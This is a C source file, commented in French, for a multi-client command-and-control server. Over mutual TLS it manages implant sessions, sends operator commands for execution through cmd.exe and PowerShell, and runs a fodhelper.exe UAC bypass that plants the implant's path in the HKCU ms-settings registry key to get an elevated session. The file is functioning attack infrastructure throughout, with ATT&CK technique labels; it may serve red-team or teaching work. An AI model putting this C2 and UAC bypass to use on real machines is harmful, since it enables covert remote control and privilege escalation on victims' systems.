/*
 * c2_server.c — Serveur C2 multi-client avec TLS mutuel (mTLS).
 *
 * Architecture :
 *   - Un thread d'écoute (accept_thread) tourne en arrière-plan et accepte
 *     les connexions TLS entrantes. Chaque implant connecté est enregistré
 *     comme une "session" avec un identifiant unique (0, 1, 2…).
 *   - Le thread principal gère l'interface opérateur : menu de sélection
 *     des sessions et shell interactif par session.
 *   - La première connexion est automatiquement sélectionnée (pas besoin
 *     de taper 'use 0').
 *
 * Commandes du menu principal [C2]> :
 *   sessions / list   — affiche toutes les sessions (actives et mortes)
 *   use <id>          — entre dans le shell interactif d'une session
 *   exit / quit       — ferme toutes les sessions et quitte le C2
 *   help              — affiche l'aide
 *
 * Commandes dans une session [S<id>]> :
 *   <commande>        — exécutée par l'implant via cmd.exe (T1059.003)
 *   ps <commande>     — exécutée via PowerShell (T1059.001)
 *   elevate           — élévation de privilèges UAC bypass (T1548.002),
 *                        l'implant détecte son propre chemin, lance fodhelper,
 *                        et le C2 switch automatiquement sur la session admin
 *   bg / background   — retour au menu principal sans fermer la session
 *   close             — ferme la session (kill l'implant) et retour au menu
 *   exit              — envoie 'exit' à l'implant (il s'arrête)
 *
 * Protocole implant :
 *   - Les commandes sont envoyées en clair sur le canal TLS.
 *   - Les réponses se terminent par le marqueur "\x00END" (4 octets).
 *   - 'exit' provoque un ack "BYE" de l'implant puis déconnexion.
 *
 * MITRE ATT&CK :
 *   T1071.001 — Application Layer Protocol (HTTPS/TLS)
 *   T1573.001 — Encrypted Channel (mTLS)
 *
 * Compilation (Linux / Ubuntu) :
 *   gcc -Wall -Wextra -O2 -o c2_server c2_server.c tls.c \
 *       -lssl -lcrypto -lpthread
 */

#include "tls.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#define BUFFER_SIZE   4096     /* taille max d'une réponse de l'implant   */
#define MAX_CMD_LEN   1024     /* taille max d'une commande opérateur     */
#define MAX_SESSIONS  32       /* nombre max de sessions simultanées      */

/* ========================= Gestion des sessions ========================= */

typedef struct {
    int          id;           /* identifiant unique (0, 1, 2…)           */
    tls_conn    *conn;         /* connexion TLS vers l'implant            */
    char         info[128];    /* description affichée dans 'sessions'    */
    int          alive;        /* 1 = active, 0 = déconnectée/fermée     */
    pthread_t    tid;          /* réservé pour usage futur                */
} session_t;

static session_t       g_sessions[MAX_SESSIONS];
static int             g_session_count = 0;
static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;

static int g_listener_fd = -1; /* fd du socket d'écoute TCP              */

/*
 * add_session — Enregistre une nouvelle connexion dans le tableau global.
 * Thread-safe (protégé par g_lock).
 * Retourne l'ID de la session, ou -1 si le max est atteint.
 */
static int add_session(tls_conn *c) {
    pthread_mutex_lock(&g_lock);
    if (g_session_count >= MAX_SESSIONS) {
        pthread_mutex_unlock(&g_lock);
        return -1;
    }
    int id = g_session_count;
    g_sessions[id].id    = id;
    g_sessions[id].conn  = c;
    g_sessions[id].alive = 1;
    snprintf(g_sessions[id].info, sizeof(g_sessions[id].info),
             "Implant #%d (%s)", id, tls_version(c));
    g_session_count++;
    pthread_mutex_unlock(&g_lock);
    return id;
}

/* ========================= Thread d'écoute ========================= */

/*
 * accept_thread — Boucle infinie qui accepte les connexions TLS entrantes.
 * Tourne dans un thread séparé pour que le menu principal reste réactif.
 * Chaque nouvelle connexion est ajoutée au tableau g_sessions.
 */
static void *accept_thread(void *arg) {
    (void)arg;
    while (1) {
        /* Bloque jusqu'à la prochaine connexion TLS (handshake mTLS inclus) */
        tls_conn *c = tls_accept_on(g_listener_fd);
        if (!c) continue;

        int id = add_session(c);
        if (id < 0) {
            fprintf(stderr, "[C2] Max sessions atteint, connexion refusée\n");
            tls_close(c);
            continue;
        }
        /* Notification dans le terminal (peut interrompre l'affichage du prompt) */
        printf("\n[+] Nouvelle session #%d (%s)\n", id, tls_version(c));
        printf("[C2]> ");
        fflush(stdout);
    }
    return NULL;
}

/* ========================= Shell interactif ========================= */

/*
 * interact — Shell interactif avec une session.
 *
 * L'opérateur tape des commandes qui sont envoyées à l'implant via TLS.
 * Les réponses sont affichées jusqu'au marqueur "\x00END".
 *
 * Commandes locales (interceptées côté C2, pas envoyées à l'implant) :
 *   bg/background  — retour au menu sans fermer la connexion
 *   close          — envoie 'exit' à l'implant et ferme la session
 *   elevate        — UAC bypass : envoie 'elevate' à l'implant, attend
 *                     la nouvelle session élevée, puis switch dessus
 *
 * La fonction est récursive : 'elevate' appelle interact() sur la
 * nouvelle session élevée. Quand on fait 'bg' depuis la session élevée,
 * on revient dans la session parente, puis un autre 'bg' ramène au menu.
 */
static void interact(session_t *s) {
    char cmd[MAX_CMD_LEN];
    char buf[BUFFER_SIZE];
    int  n;

    printf("[*] Session #%d — %s\n", s->id, s->info);
    printf("[*] 'elevate' = admin | 'bg' = menu | 'close' = fermer session | 'exit' = quitter implant\n\n");

    for (;;) {
        printf("[S%d]> ", s->id);
        fflush(stdout);

        if (fgets(cmd, sizeof(cmd), stdin) == NULL)
            break;

        /* Nettoyage du '\n' final */
        size_t len = strlen(cmd);
        if (len > 0 && cmd[len - 1] == '\n')
            cmd[--len] = '\0';
        if (len == 0)
            continue;

        /* --- Commandes locales (pas envoyées à l'implant) --- */

        /* bg : retour au menu principal, la session reste ouverte */
        if (strcmp(cmd, "background") == 0 || strcmp(cmd, "bg") == 0)
            break;

        /* close : envoie 'exit' à l'implant pour le tuer, puis retour menu */
        if (strcmp(cmd, "close") == 0) {
            tls_send(s->conn, "exit", 4);
            tls_recv(s->conn, buf, sizeof(buf) - 1); /* ack "BYE" */
            printf("[*] Session #%d fermée\n", s->id);
            tls_close(s->conn);
            s->conn  = NULL;
            s->alive = 0;
            break;
        }

        if (!s->alive) {
            printf("[!] Session morte\n");
            break;
        }

        /* elevate : UAC bypass automatique via fodhelper.exe (T1548.002)
         *
         * Fonctionnement :
         *   1. Envoie "elevate" à l'implant
         *   2. L'implant détecte son propre chemin (GetModuleFileNameA)
         *   3. L'implant écrit le chemin dans la clé de registre
         *      HKCU\Software\Classes\ms-settings\Shell\Open\command
         *   4. L'implant lance fodhelper.exe (auto-elevate, pas de prompt UAC)
         *   5. fodhelper lit la clé de registre et exécute l'implant en admin
         *   6. L'implant élevé se connecte au C2 → nouvelle session
         *   7. Le C2 détecte la nouvelle session et switch dessus
         */
        if (strcmp(cmd, "elevate") == 0) {
            int before = g_session_count;

            /* Envoie la commande à l'implant */
            if (tls_send(s->conn, "elevate", 7) <= 0) {
                fprintf(stderr, "[C2] Envoi échoué\n");
                s->alive = 0;
                break;
            }

            /* Affiche la réponse de l'implant (succès ou erreur) */
            while ((n = tls_recv(s->conn, buf, sizeof(buf) - 1)) > 0) {
                buf[n] = '\0';
                fputs(buf, stdout);
                if (n >= 4 && memcmp(buf + n - 4, "\x00END", 4) == 0)
                    break;
                if (n < (int)sizeof(buf) - 1)
                    break;
            }

            /* Attend que l'implant élevé se connecte (max 10 secondes) */
            printf("\n[*] Attente de la session élevée…\n");
            fflush(stdout);
            for (int w = 0; w < 20; w++) {
                usleep(500000); /* 500ms par itération, 20 × 500ms = 10s max */
                if (g_session_count > before) break;
            }

            /* Si une nouvelle session est apparue, on switch dessus */
            if (g_session_count > before) {
                int new_id = g_session_count - 1;
                printf("[+] Session élevée #%d connectée !\n\n", new_id);
                interact(&g_sessions[new_id]); /* appel récursif */
            } else {
                printf("[!] Timeout — aucune nouvelle session détectée\n");
            }
            continue;
        }

        /* --- Commandes envoyées à l'implant --- */

        if (tls_send(s->conn, cmd, (int)len) <= 0) {
            fprintf(stderr, "[C2] Envoi échoué — session fermée\n");
            s->alive = 0;
            break;
        }

        /* exit : l'implant s'arrête complètement (pas juste la session) */
        if (strcmp(cmd, "exit") == 0) {
            tls_recv(s->conn, buf, sizeof(buf) - 1); /* ack "BYE" */
            printf("[*] Session #%d fermée\n", s->id);
            tls_close(s->conn);
            s->conn  = NULL;
            s->alive = 0;
            break;
        }

        /* Réception de la sortie de la commande.
         * L'implant envoie la sortie suivie de "\x00END" (marqueur de fin).
         * On boucle tant qu'on n'a pas reçu le marqueur. */
        while ((n = tls_recv(s->conn, buf, sizeof(buf) - 1)) > 0) {
            buf[n] = '\0';
            fputs(buf, stdout);
            fflush(stdout);

            /* Détecte le marqueur de fin "\x00END" (4 derniers octets) */
            if (n >= 4 && memcmp(buf + n - 4, "\x00END", 4) == 0)
                break;
            /* Réponse courte : tout reçu en un seul SSL_read */
            if (n < (int)sizeof(buf) - 1)
                break;
        }
        if (n <= 0) {
            fprintf(stderr, "[C2] Implant #%d déconnecté\n", s->id);
            s->alive = 0;
            break;
        }
        printf("\n");
    }
}

/* ========================= Point d'entrée ========================= */

int main(int argc, char *argv[]) {
    const char *ip;
    char        cmd[MAX_CMD_LEN];
    pthread_t   accept_tid;

    /* Charge la configuration depuis .env (SERVER_BIND_IP, SERVER_PORT, certs) */
    cfg_load(".env");
    ip = (argc >= 2) ? argv[1] : cfg_get("SERVER_BIND_IP", "0.0.0.0");

    /* Initialisation réseau (WSAStartup sur Windows, no-op sur Linux) */
    if (tls_init() != 0) {
        fprintf(stderr, "[C2] Init réseau impossible\n");
        return 1;
    }

    printf("[*] C2 Server — TLS/mTLS (multi-client)\n");
    fflush(stdout);

    /* Crée le socket d'écoute TCP (bind + listen) */
    g_listener_fd = tls_listen(ip, cfg_port());
    if (g_listener_fd < 0) {
        fprintf(stderr, "[C2] Impossible d'écouter sur %s:%d\n", ip, cfg_port());
        return 1;
    }

    /* Lance le thread d'écoute en arrière-plan.
     * Il accepte les connexions TLS et les ajoute à g_sessions[]. */
    pthread_create(&accept_tid, NULL, accept_thread, NULL);
    pthread_detach(accept_tid);

    /* Attend la première connexion d'un implant avant d'afficher le prompt.
     * Polling toutes les 200ms sur g_session_count (modifié par accept_thread). */
    printf("[*] En attente de connexion…\n");
    fflush(stdout);

    while (g_session_count == 0)
        usleep(200000);

    /* Auto-entre dans la première session (pas besoin de 'use 0') */
    printf("[+] Implant connecté — session #0\n\n");
    interact(&g_sessions[0]);

    /* --- Menu principal --- */
    /* On arrive ici quand l'opérateur fait 'bg' depuis une session,
     * ou quand une session se ferme (close/exit/déconnexion). */
    for (;;) {
        printf("[C2]> ");
        fflush(stdout);

        if (fgets(cmd, sizeof(cmd), stdin) == NULL)
            break;

        size_t len = strlen(cmd);
        if (len > 0 && cmd[len - 1] == '\n')
            cmd[--len] = '\0';
        if (len == 0)
            continue;

        /* sessions : affiche le tableau de toutes les sessions */
        if (strcmp(cmd, "sessions") == 0 || strcmp(cmd, "list") == 0) {
            pthread_mutex_lock(&g_lock);
            printf("\n  ID   État     Info\n");
            printf("  ---  -------  ----\n");
            for (int i = 0; i < g_session_count; i++) {
                printf("  %-3d  %-7s  %s\n", i,
                       g_sessions[i].alive ? "active" : "morte",
                       g_sessions[i].info);
            }
            if (g_session_count == 0)
                printf("  (aucune session)\n");
            printf("\n");
            pthread_mutex_unlock(&g_lock);
            continue;
        }

        /* use <id> : entre dans le shell interactif d'une session */
        if (strncmp(cmd, "use ", 4) == 0) {
            int id = atoi(cmd + 4);
            pthread_mutex_lock(&g_lock);
            if (id < 0 || id >= g_session_count) {
                printf("[!] Session #%d invalide\n", id);
                pthread_mutex_unlock(&g_lock);
                continue;
            }
            if (!g_sessions[id].alive) {
                printf("[!] Session #%d morte\n", id);
                pthread_mutex_unlock(&g_lock);
                continue;
            }
            session_t *s = &g_sessions[id];
            pthread_mutex_unlock(&g_lock);
            interact(s);
            continue;
        }

        /* exit/quit : ferme proprement toutes les sessions et quitte */
        if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) {
            printf("[*] Fermeture du C2…\n");
            pthread_mutex_lock(&g_lock);
            for (int i = 0; i < g_session_count; i++) {
                if (g_sessions[i].alive && g_sessions[i].conn) {
                    tls_send(g_sessions[i].conn, "exit", 4);
                    tls_close(g_sessions[i].conn);
                    g_sessions[i].conn  = NULL;
                    g_sessions[i].alive = 0;
                }
            }
            pthread_mutex_unlock(&g_lock);
            break;
        }

        if (strcmp(cmd, "help") == 0) {
            printf("\n  sessions / list   — lister les sessions\n");
            printf("  use <id>          — interagir avec une session\n");
            printf("  exit / quit       — quitter le C2\n\n");
            continue;
        }

        printf("[!] Commande inconnue. Tapez 'help'\n");
    }

    tls_cleanup();
    return 0;
}
